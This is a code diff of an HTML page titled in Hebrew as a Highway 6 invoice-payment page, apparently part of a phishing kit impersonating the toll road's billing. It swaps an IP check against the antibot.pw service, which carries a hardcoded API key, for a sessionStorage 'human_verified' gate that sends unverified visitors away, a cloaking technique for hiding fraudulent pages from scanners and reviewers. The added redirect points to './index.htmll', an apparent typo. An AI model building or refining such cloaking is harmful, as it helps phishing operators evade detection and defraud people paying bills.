@@ -5,44 +5,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>תשלום חשבוניות - כביש 6</title>
     <script>
-        // Antibot IP protection on this page
+        // Client-side antibot: require that index.html already verified the session
         (function () {
-            // Allow local development without checks
             if (location.hostname === '127.0.0.1' || location.hostname === 'localhost') {
                 return;
             }
-
-            function blockAccess() {
-                // You can change this behavior to show a nicer message if you prefer
-                window.location.href = './index.htm';
+            try {
+                if (!sessionStorage.getItem('human_verified')) {
+                    window.location.href = './index.htmll';
+                }
+            } catch (e) {
+                window.location.href = './index.htmll';
             }
-
-            // 1) Get client IP
-            fetch('https://api.ipify.org?format=json')
-                .then(function (r) { return r.json(); })
-                .then(function (data) {
-                    var ip = data && data.ip;
-                    if (!ip) {
-                        throw new Error('No IP');
-                    }
-
-                    // 2) Call antibot.pw API
-                    var apiKey = '49d1b63be75a9c08f88e40bf54f08401';
-                    var url = 'https://antibot.pw/api/v2-txt?ip=' + encodeURIComponent(ip) + '&key=' + encodeURIComponent(apiKey);
-                    return fetch(url);
-                })
-                .then(function (r) { return r.text(); })
-                .then(function (txt) {
-                    var result = (txt || '').trim();
-                    if (result !== 'good') {
-                        // Blocked / suspicious IP
-                        blockAccess();
-                    }
-                })
-                .catch(function () {
-                    // On any error, also block
-                    blockAccess();
-                });
         })();
     </script>
     <style>
@@ -727,7 +701,7 @@
         function back() {
             showLoading();
             setTimeout(() => {
-                window.location.href = "./index.htm";
+                window.location.href = "./index.html";
             }, 1000);
         }
     </script>
